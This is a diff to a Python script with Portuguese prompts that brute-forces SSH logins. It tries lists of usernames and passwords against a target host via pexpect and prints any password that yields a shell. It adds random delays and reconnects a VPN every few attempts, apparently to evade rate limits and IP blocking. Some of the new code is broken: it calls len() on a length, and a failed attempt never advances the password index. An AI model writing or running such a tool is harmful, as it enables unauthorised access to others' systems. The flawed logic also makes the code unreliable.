@@ -3,13 +3,15 @@ import random
 import passwords
 import time
 import vpn
+import users
 
-passwords = passwords.passwords_
+passwordsl = passwords.passwords_
+usersl = users.users_
 openvpn_enter = vpn.openvpn_enter_()
 
 finded = False
 
-i = 0
+j = 0
 
 KEY_CONFIRMATION = "key_confirmation"
 FIRST_PASSWORD = "first_password"
@@ -25,41 +27,46 @@ def expect_state(process, states):
     result = process.expect(patterns)
     return states[result][0]
 
-i = int(input("Qual o valor inicial: "))
+i = int(input("Qual o valor inicial do usuário: "))
+j = int(input("Qual o valor inicial da senha: "))
 
-user = str(input("Qual o usuário: "))
 destino = str(input("Qual o destino: "))
 port = str(input("Qual a porta: "))
 
 next_ = random.randint(30, 45)
 next5 = 5
 
-while i < len(passwords):
+tries_exceeded = 0
 
-    with open("/tmp/mysql_i", "w") as f:
-        f.write(str(i))
+while i < len(len(usersl)):
+    
+    with open("/tmp/status", "r") as f:
+        lines = f.readlines()
 
-    process = pexpect.spawn(
-        "ssh",
-        [f"{user}@{destino}", "-p", port],
-        encoding="utf-8",
-        timeout=10,
-    )
+    lines[1] = f"{i}\n"
 
-    result = expect_state(process, [
-        (KEY_CONFIRMATION, r"Are you sure you want to continue connecting"),
-        (FIRST_PASSWORD, r"\(.*\) Password:"),
-        (PASSWORD, r".+'s password:"),
-        (SHELL, r"[^ \r\n]+@[^ \r\n]+:\/\$"),
-        (DENIED, r"Permission denied"),
-        (END, pexpect.EOF),
-        (TIMEOUT, pexpect.TIMEOUT),
-    ])
+    with open("/tmp/status", "w") as f:
+        f.writelines(lines)
 
-    if result == KEY_CONFIRMATION:
-        print("Aceitando a chave do servidor...")
-        process.sendline("yes")
+    while j < len(len(passwordsl)):
+
+        with open("/tmp/status", "r") as f:
+            lines = f.readlines()
+    
+        lines[2] = f"{j}\n"
+
+        with open("/tmp/status", "w") as f:
+            f.writelines(lines)
+
+        process = pexpect.spawn(
+            "ssh",
+            [f"{usersl[i]}@{destino}", "-p", port],
+            encoding="utf-8",
+            timeout=10,
+        )
+
         result = expect_state(process, [
+            (KEY_CONFIRMATION, r"Are you sure you want to continue connecting"),
             (FIRST_PASSWORD, r"\(.*\) Password:"),
             (PASSWORD, r".+'s password:"),
             (SHELL, r"[^ \r\n]+@[^ \r\n]+:\/\$"),
@@ -68,51 +75,80 @@ while i < len(passwords):
             (TIMEOUT, pexpect.TIMEOUT),
         ])
 
-    while result in (FIRST_PASSWORD, PASSWORD):
-        process.sendline(str(passwords[i]))
-        result = expect_state(process, [
-            (PASSWORD, r".+'s password:"),
-            (SHELL, r"[^ \r\n]+@[^ \r\n]+:\/\$"),
-            (DENIED, r"Permission denied"),
-            (END, pexpect.EOF),
-            (TIMEOUT, pexpect.TIMEOUT),
-        ])
+        if result == KEY_CONFIRMATION:
+            print("Aceitando a chave do servidor...")
+            process.sendline("yes")
+            result = expect_state(process, [
+                (FIRST_PASSWORD, r"\(.*\) Password:"),
+                (PASSWORD, r".+'s password:"),
+                (SHELL, r"[^ \r\n]+@[^ \r\n]+:\/\$"),
+                (DENIED, r"Permission denied"),
+                (END, pexpect.EOF),
+                (TIMEOUT, pexpect.TIMEOUT),
+            ])
 
-    if result == SHELL:
-        password = passwords[i]
-        print(password)
+        while result in (FIRST_PASSWORD, PASSWORD):
+            process.sendline(str(passwordsl[j]))
+            result = expect_state(process, [
+                (PASSWORD, r".+'s password:"),
+                (SHELL, r"[^ \r\n]+@[^ \r\n]+:\/\$"),
+                (DENIED, r"Permission denied"),
+                (END, pexpect.EOF),
+                (TIMEOUT, pexpect.TIMEOUT),
+            ])
 
-        finded = True
+        if result == SHELL:
+            password = passwordsl[j]
+            print(password)
 
-        with open("/tmp/mysql_finded", "w") as f:
-            f.write("True")
+            finded = True
 
-        break
+            with open("/tmp/status", "r") as f:
+                lines = f.readlines()
+            
+            lines[3] = "True\n"
 
-    if result == DENIED:
-        print("Permissão negada.")
-    elif result == END:
-        print("A conexão foi encerrada.")
-    elif result == TIMEOUT:
-        print("Tempo limite atingido.")
+            with open("/tmp/status", "w") as f:
+                f.writelines(lines)
+
+            break
+
+        if result == DENIED:
+            print("Permissão negada.")
+        elif result == END:
+            print("A conexão foi encerrada.")
+        elif result == TIMEOUT:
+            print("Tempo limite atingido.")
+            
+        if j == next_:
+            time.sleep(random.randint(15, 20))
+            next_ += random.randint(35, 55)
+
+        delay = random.randint(1, 3)
+        time.sleep(delay)
+
+        if result in (DENIED, END, TIMEOUT):
+            tries_exceeded += 1
+
+            if tries_exceeded >= 15:
+                print("Muitas tentativas falhadas. Encerrando...")
+                break
+
+            process.close()
+            continue
+
+        tries_exceeded = 0
         
-    if i == next_:
-        time.sleep(random.randint(15, 20))
-        next_ += random.randint(35, 55)
-
-    delay = random.randint(1, 3)
-    time.sleep(delay)
-
-    if result != SHELL:
-        process.close()
-        i += 1
-
-        if i >= next5:
+        if j >= next5:
             openvpn_enter.close()
             openvpn_enter = vpn.openvpn_enter_()
-
             next5 += 5
 
-        continue
+        j += 1
+
+    i += 1
+
+    if tries_exceeded >= 15:
+        break
 
 openvpn_enter.close()
